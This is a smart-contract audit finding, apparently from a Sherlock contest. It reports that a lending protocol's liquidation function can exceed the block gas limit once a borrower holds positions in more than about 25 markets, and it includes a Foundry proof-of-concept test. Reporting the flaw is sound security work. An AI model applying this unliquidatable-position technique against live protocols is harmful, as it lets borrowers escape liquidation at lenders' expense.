Unique Garnet Reindeer

high

# Users liquidation can become impossible because reach gas limit

## Summary

When liquidate users' position, it can become impossible to liquidate because the `Market::liquidate` gas cost is too high and can reach the ethereum gas limit easily.


## Vulnerability Detail

When liquidate borrower position, `Market::liquidate` call trace: [`auditor.checkLiquidation`](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Auditor.sol#L195-L233) -> [`Market::accountSnapshot`](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Market.sol#L785-L817) to account every market account liquidity, but the the gas cost is too high. According to test call trace in local, every call `Market::accountSnapshot` cost about ~1187334 wei, so the current [ethereum gas limit](https://etherscan.io/block/19767464) and [optimism gas limit](https://optimistic.etherscan.io/block/119438983) 30,000,000 can easily reach if the borrower's markets more than 25(1187334 * 25 = 29683350), it can cause the liquidation become impossible. So malicious users can borrow more than 25 markets to cause their positions can't be liquidated.

PoC:

```solidity
function testDosDueReachGasLimit() external {
    irm.setRate(0);
    vm.warp(0);
    Market[25] memory markets;
    string[25] memory symbols = [
      "DAI", "USDC", "WETH", "WBTC", "UNI",
      "SYN", "LINK", "BTC", "ETH", "LTC",
      "XRP", "ADA", "DOGE", "UNI", "SYN",
      "LINK", "BTC", "ETH", "LTC", "XRP",
      "ADA", "DOGE", "TIME", "MUSK", "OP"
    ];
    for (uint256 i = 0; i < symbols.length; i++) {
      MockERC20 asset = new MockERC20(symbols[i], symbols[i], 18);
      markets[i] = Market(address(new ERC1967Proxy(address(new Market(asset, auditor)), "")));
      markets[i].initialize(
        "",
        3,
        1e18,
        InterestRateModel(address(irm)),
        0.02e18 / uint256(1 days),
        1e17,
        0,
        0.0046e18,
        0.42e18
      );

      auditor.enableMarket(markets[i], daiPriceFeed, 0.8e18);
      asset.mint(BOB, 50_000 ether);
      asset.mint(address(this), 50_000 ether);
      vm.prank(BOB);
      asset.approve(address(markets[i]), type(uint256).max);
      asset.approve(address(markets[i]), type(uint256).max);
      markets[i].deposit(30_000 ether, address(this));
    }

    // since 224 is the max amount of consecutive maturities where an account can borrow
    // 221 is the last valid cycle (the last maturity where it borrows is 224)
    for (uint256 m = 0; m < 221; m += 3) {
      vm.warp(FixedLib.INTERVAL * m);
      for (uint256 i = 0; i < markets.length; ++i) {
        for (uint256 j = m + 1; j <= m + 3; ++j) {
          markets[i].borrowAtMaturity(FixedLib.INTERVAL * j, 1 ether, 1.2 ether, address(this), address(this));
        }
      }
    }

    // repay does not increase in cost
    markets[0].repayAtMaturity(FixedLib.INTERVAL, 1 ether, 1000 ether, address(this));
    // withdraw DOES increase in cost
    markets[0].withdraw(1 ether, address(this), address(this));

    // normal operations of another account are not impacted
    vm.prank(BOB);
    markets[0].deposit(100 ether, BOB);
    vm.prank(BOB);
    markets[0].withdraw(1 ether, BOB, BOB);
    vm.prank(BOB);
    vm.warp(FixedLib.INTERVAL * 400);
    markets[0].borrowAtMaturity(FixedLib.INTERVAL * 401, 1 ether, 1.2 ether, BOB, BOB);

    // liquidate function to account's borrows DOES increase in cost
    vm.prank(BOB);
    uint256 gas_bef = gasleft();  
    markets[0].liquidate(address(this), 1_000 ether, markets[0]);
    uint256 gas_after = gasleft();
    // 30_000_000 is currently ethereum gas limit
    assertGt(gas_bef - gas_after, 30_000_000);
}
```

This case is modified based on `testMultipleBorrowsForMultipleAssets` test case, insert the case into `Market.t.sol` directly.

## Impact

Users can't be liquidated if their's borrow markets more than 25.


## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Market.sol#L545-L601

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/8f6ef1b0868d3ea3a98a5ab7e8b3a164857681d7/protocol/contracts/Auditor.sol#L195-L262


## Tool used

vscode, Manual Review

## Recommendation

Redesign `Auditor#checkLiquidation` to decrease gas cost, or limit users max borrowable market numbers.

